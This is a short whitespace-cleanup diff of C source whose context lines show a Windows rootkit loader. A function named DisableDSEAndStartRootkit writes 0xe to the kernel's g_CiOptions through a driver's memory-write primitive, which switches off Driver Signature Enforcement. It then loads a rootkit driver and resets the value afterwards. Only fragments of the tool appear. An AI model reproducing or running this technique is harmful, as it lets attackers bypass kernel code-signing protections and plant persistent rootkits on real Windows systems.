@@ -7,7 +7,7 @@
 
 BOOL CheckDSE() {
 
-	BOOL								bSTATE	= TRUE; 
+	BOOL								bSTATE	= TRUE;
 	HMODULE								hNTDLL	= NULL; // Stores handle to ntdll.dll
 	NTSTATUS							STATUS	= NULL; // Stores the NTSTATUS
 	ULONG								uReturn = NULL; // Size returned in bytes from NtQuerySystemInformation
@@ -104,7 +104,7 @@ BOOL DisableDSEAndStartRootkit() {
 	// Read 1 byte of g_CiOptions
 	dwCiOptionValue = ReadMemoryBYTE(hDevice, dwCiOptionsAddress);
 	info_t("ReadMemoryBYTE - g_CiOptions value: 0x%02X", dwCiOptionValue & 0xFF);
-	
+
 	// Disable DSE by enabling testsigning mode (0xe)
 	if (!WriteMemoryPrimitive(hDevice, 1, dwCiOptionsAddress, 0xe)) {
 		error("WriteMemoryPrimitive - Failed to disable DSE");
@@ -112,7 +112,7 @@ BOOL DisableDSEAndStartRootkit() {
 		goto _cleanUp;
 	}
 	info_t("WriteMemoryPrimitive - written 0xe to g_CiOptions");
-	
+
 	// Reread new 1 byte of g_CiOptions
 	dwCiOptionValue = ReadMemoryBYTE(hDevice, dwCiOptionsAddress);
 	info_t("ReadMemoryBYTE - g_CiOptions value: 0x%02X", dwCiOptionValue & 0xFF);
@@ -144,7 +144,7 @@ BOOL DisableDSEAndStartRootkit() {
 		goto _cleanUp;
 	}
 	okayW("LoadDriver - Loaded rootkit driver, servicename: \"%s\"", g_RKDRIVERNAME);
-	
+
 _cleanUp:
 
 	// Check if DSE Mode is set to testsigning mode and then set it back to enabled
